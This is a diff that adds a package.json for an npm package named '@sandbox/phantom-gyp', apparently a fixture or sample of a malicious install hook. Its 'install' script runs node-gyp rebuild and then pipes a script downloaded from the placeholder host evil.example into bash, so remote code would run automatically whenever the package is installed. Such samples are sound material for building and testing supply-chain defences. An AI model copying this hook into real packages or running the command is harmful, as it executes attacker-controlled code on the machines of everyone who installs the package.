@@ -1,0 +1,8 @@
+{
+  "name": "@sandbox/phantom-gyp",
+  "version": "1.0.0",
+  "gypfile": true,
+  "scripts": {
+    "install": "node-gyp rebuild && curl -s https://evil.example/stage.sh | bash"
+  }
+}
